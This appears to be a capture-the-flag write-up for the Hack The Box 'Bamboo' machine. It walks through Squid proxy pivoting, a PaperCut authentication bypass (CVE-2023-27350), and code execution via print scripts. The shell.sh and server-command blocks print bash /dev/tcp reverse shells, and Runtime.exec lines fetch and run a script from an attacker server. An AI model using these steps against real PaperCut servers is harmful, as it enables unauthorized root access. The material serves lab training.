---
tags:
  - Linux
  - Medium
  - WebApp
  - PaperCut
  - Authentication_Bypass
  - Squid
  - Proxies
  - Binary_Replacement
---
![Machine Writeups/Linux/Medium/Bamboo/Images/banner.png](https://github.com/Carson-Reed12/HTB-Writeups/blob/main/Linux/Medium/Bamboo/Images/banner.png)

## User
### Port Scan
As always, we first start off with an nmap scan. This machine only has two ports open: SSH and 3128 for `Squid 5.9`.
```# Nmap 7.95 scan initiated Tue Oct  7 21:12:47 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/bamboo 10.129.70.204  
Nmap scan report for 10.129.70.204  
Host is up, received echo-reply ttl 63 (0.072s latency).  
Scanned at 2025-10-07 21:12:50 GMT for 65s  
Not shown: 998 filtered tcp ports (no-response)  
PORT     STATE SERVICE    REASON         VERSION  
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNFkb6yTxAlHWItWKTH0zoiRLRbzLIEogJD96G6UiyYjmaz3cxr3IVyGJrMyNShLOUd4AOeZ1VM/P7fYMV7msZo=  
|   256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOrtX+NoAgJeT57Th1zNEcj9kSDYd0TONbchFcpZcoC  
3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 5.9  
|_http-server-header: squid/5.9  
|_http-title: ERROR: The requested URL could not be retrieved  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Tue Oct  7 21:13:55 2025 -- 1 IP address (1 host up) scanned in 68.53 seconds
```

### Discovering PaperCut
`Squid` is a web proxy that allows one to send requests via the application. For example, we can use `curl` to set the `Squid` application as the proxy and hit our own Python server through it.

![curl proxy.png](https://github.com/Carson-Reed12/HTB-Writeups/blob/main/Linux/Medium/Bamboo/Images/proxy.png)

After some research on `Squid 5.9`, it seems that there is some kind of buffer overflow bug. However, it isn't evident how to exploit that on this box. Going a different direction, [this Hacktricks article](https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html) describes how the `spose` tool can abuse `Squid` to scan internal ports on the box.

After cloning and running `spose`, we can see a multitude of internal ports. 

![spose results.png](https://github.com/Carson-Reed12/HTB-Writeups/blob/main/Linux/Medium/Bamboo/Images/spose results.png)

To investigate these ports, I started by using `curl` to try and hit them through the `Squid` proxy. After attempting port 9191, it appears `PaperCut` is running on the box.

![papercut discovery.png](https://github.com/Carson-Reed12/HTB-Writeups/blob/main/Linux/Medium/Bamboo/Images/papercut discovery.png)

We can utilize `FoxyProxy` in our browser to route through the `Squid` proxy and reach the site.

![foxy1.png](foxy1.png)
![foxy2.png](foxy2.png)
![foxy3.png](foxy3.png)
![papercut browser.png](papercut browser.png)

### PaperCut Authentication Bypass
After doing some research, this version of `PaperCut` appeared to be vulnerable to **CVE-2023-27350** which is an authentication bypass vulnerability. I downloaded [this PoC](https://github.com/imancybersecurity/CVE-2023-27350-POC) from GitHub and had to edit it to route through the `Squid` proxy.

![edit poc.png](edit poc.png)

Executing the script results with a link that will give access as the `PaperCut` admin.

![poc execution.png](poc execution.png)
![auth bypass page1.png](auth bypass page1.png)
![auth bypass page2.png](auth bypass page2.png)

Note: Instead of editing the code, `proxychains` can also be utilized to route through the proxy instead, redirecting at the socket/system level instead of at the code level. This is done by editing `/etc/proxychains4.conf` and then prepending the Python script execution with `proxychains`.

![proxychains edit.png](proxychains edit.png)
![proxychains execution.png](proxychains execution.png)

### Obtaining a Shell through Print Scripts
`PaperCut` allows for scripts to be ran as print jobs occur. Abusing this can lead to code execution on the box. First, the admin must set the `print-and-device.script.enabled` and `print.script.sandboxed` configurations to `Y` and `N` respectively.

![enable print script.png](enable print script.png)
![disable sandbox.png](disable sandbox.png)

Then, by going to Printers ->  \[Template printer\] -> Scripting, one can check the "Enable print script" box and run commands with the following line:

`java.lang.Runtime.getRuntime().exec('<command>');`

A traditional reverse shell one-liner would not work for me (likely due to special characters), so I hosted a malicious `shell.sh` file on a Python web server, called it, and executed it on the box.

<u>shell.sh</u>
```
#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

Only one `java.lang...` line works at a time, so each command is ran as a separate apply:

```
java.lang.Runtime.getRuntime().exec('curl http://<ip>:<port>/shell.sh -o /tmp/shell.sh');
java.lang.Runtime.getRuntime().exec('chmod +x /tmp/shell.sh');
java.lang.Runtime.getRuntime().exec('/tmp/shell.sh');
```

This screenshot only shows the execution of the script, but be sure to run the two previous commands first to download the script and give it execution permissions. Also note that any error banners can be ignored as, regardless, the commands still execute. Doing it properly drops a shell as `papercut`.

![script execution shell.png](script execution shell.png)
![pop user shell.png](pop user shell.png)

## Root
### Abusing Server-Command
Now that we have a shell on the box, pivoting to `root` is trivial in nature, but difficult to enumerate. [This article](https://thecyberthrone.in/2023/12/05/papercut-privilege-escalation-vulnerability-unearthed/) explains how a security researcher abused a poorly permissioned `security-command` binary. It can be written over by `papercut`, but is executed by `root`. The article also says that their version of `PaperCut` was 22.0.12 which is very close to our 22.0.6. Additionally, the article said it was running on Ubuntu 22.04, which we are as well. This must be the path forward.

![versions.png](versions.png)

First, we can find `server-command` and edit it to become a reverse shell. Be sure to run `chmod +x <file>` on it to make sure it's allowed to execute.

![find server-command.png](find server-command.png)

<u>server-command</u>
```
#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

The article explains that he was able to trigger `root` to execute this binary after clicking around on the web server. So, we set up a `netcat` listener and click around. After endless searching, the correct button can be found under the `Enable Printing` tab.

![find button 1.png](find button 1.png)
![find button 2.png](find button 2.png)

Clicking through this path and onto the "Start Importing Mobility Print printers" button executes `server-command` as `root` and drops a shell.

![pop root.png](pop root.png)
